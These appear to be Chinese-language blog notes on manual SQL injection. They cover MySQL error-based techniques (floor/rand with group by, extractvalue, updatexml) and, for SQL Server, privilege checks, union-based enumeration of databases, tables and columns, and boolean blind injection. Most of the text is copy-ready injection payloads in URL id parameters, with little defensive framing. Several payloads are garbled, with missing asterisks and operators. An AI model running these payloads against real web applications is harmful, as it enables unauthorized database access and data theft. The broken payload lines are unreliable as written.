发表于 2023-01-14

floor报错注入

rand(0)与rand()的区别

rand(0)相当于给rand()函数传递了一个参数然后rand()函数会根据0这个参数进行随机数生成
rand()生成的数字是完全随机的,而rand(0)是有规律的生成

count(*)的作用

count()是用来统计表中记录的一个函数,返回匹配条件的行数
count(*)包含所有列,返回表中记录数,相当于统计表中的行数

group by的作用

group by是用来进行分组查询的。对指定列的查询结果做分组统计，最终得到一个分组汇总表

实例

id=1’ and (select count(*),floor(rand(0)2)as a from information_schema.tables group by a)– -
id=1’ and (select 1 from(select count(),floor(rand(0)*2)as a from information_schema.tables group by a))– -
其中floor(rand(0)2)会生成一个011011的序列，而且每次运行的时候都不变
所以count(),floor(rand(0)*2)as a from users group by a运行的时候，第一次拿到的group by后面的值是0，在虚拟表中不存在，所以要再运算一次来获取group by后面的值，这时候获取的值是1
所以group by要进行两次运算

extractvalue报错注入

extractvalue(XML_document,XPath_string)
第一个参数：XML_document是string格式，为XML文档对象的名称，表示传入的目标XML文档
第二个参数：XPath_string(Xpath格式的字符串)，表示xml路径
作用：从目标XML中返回包含所查询的字符串
例：id=1 and (extractvalue(1,concat((select database()))))
id=1 and (extractvalue(1,concat(‘~’,(select database()))))
id=1 and (extractvalue(1,concat(‘/‘,(select database()))))

updatexml报错注入

updatexml(XML_document,XPath_string,new_value)
第一个参数：XML_document是string格式，为XML文档对象的名称，文中为Doc
第二个参数：XPath_string(Xpath格式的字符串)
第三个参数：new_value,string格式，替换查找到的符合条件的数据
函数作用：改变文档中符合条件的节点的值

sql 手工注入

发表于 2023-01-13

server手工注入

用户权限

sa权限：数据库操作，文件管理，命令执行，注册表读取等，拥有最高权限
and 1=(is_srvrolemember(‘sysadmin’)) //返回正常为sa
db权限：文件管理，数据库操作等
and 1=(is_member(‘db_owner’)) //返回正常值为DB_OWNER
public权限：数据库操作
and 1=(is_srvrolemember(‘public’)) //public权限较低

一般步骤

name为所查东西的名称
判断注入点是否存在
sql i.aspx?id=1’ (报错)/‘- - (正常)/‘ and 1=1- - (正常)/‘ and 1>1- - (空)
判断字段数
order by
联合查询获得系统信息
union select
获取当前数据库名
sql i.aspx?id=-1’ union select null,db_name(0),null–
?id=-1’ union select null,null,name from sys.databases where name != ‘master’ –
获取其他数据库名
sql i.aspx?id=-1’ union select null,db_name(1),null–
sql i.aspx?id=-1’ union select null,db_name(2),null–
?id=-1’ union select null,(select top 1 name from sys. databases where name not in (select top 0 name from sys. databases)),null–
?id=-1’ union select null,(select top 1 name from sys. databases where name not in (select top 1 name from sys. databases)),null–
获取当前数据表名
sql i.aspx?id=-1 union select top 1 NULL,name,NULL from test.sys.sysobjects where xtype=’U’–
获取其他数据表名
?id=-1’ union select top 1 NULL,name,NULL from test.sys.sysobjects where xtype=’U’ and name!=’users’–
?id=-1’ union select top 1 NULL,name,NULL from test.sys.sysobjects where xtype=’U’ and name!=’users’ and name !=’article’–
获取数据表中的一个字段名
?id=-1’ union select top 1 NULL,name,NULL from test.sys.syscolumns where id=OBJECT_ID(‘users’)–
获取其他字段名
?id=-1’ union select top 1 NULL,name,NULL from test.sys.syscolumns where id=OBJECT_ID(‘users’)

布尔盲注

判断是不是sql server数据库
?id=1 and exists(select * from sysobjects)
?id=1 and exists(select count() from sysobjects)
判断数据库版本信息
?id=1’ and substring((select @@version),22,4)=2008–
判断数据库用户
?id=1’ and 1=(is_srvrolemember(‘sysadmin’))–
判断数据库名称的长度
?id=1’ and len(db_name())=4 –
判断数据库名称
?id=1’ and ascii(substring(db_name(),1,1))>97 –
?id=1’ and ascii(substring(db_name(),1,1))=116 –
?id=1’ and ascii(substring(db_name(),2,1))=101 –
判断数据表的数量
?id=1’ and (select count() from test..sysobjects where xtype=’U’)=3–
判断第一个数据表的名称的长度
?id=1’ and (select top 1 len(name) from test..sysobjects where xtype=’U’)=5–
判断第二个数据表的名称长度
?id=1’ and (select top 1 len(name) from test..sysobjects where xtype=’U’ and name!=’users’)=7–
判断数据表名称的第一个字符
?id=1’ and (select top 1 ascii(substring(name,1,1)) from test..sysobjects where xtype=’U’)=117–
判断数据表中列的数量
?id=1’ and (select top 1 count(*) from test..syscolumns where id=OBJECT_ID(‘users’))=3–
判断数据表中第一个字段的长度
?id=1’ and (select top 1 len(name) from test..syscolumns where id=OBJECT_ID(‘users’))=2–
判断数据表中第一个字段的名称
?id=1’ and (select top 1 ascii(substring(name,1,1)) from test..syscolumns where id=OBJECT_ID(‘users’))=105–
(判断第二个后面加上and name!=’id’)
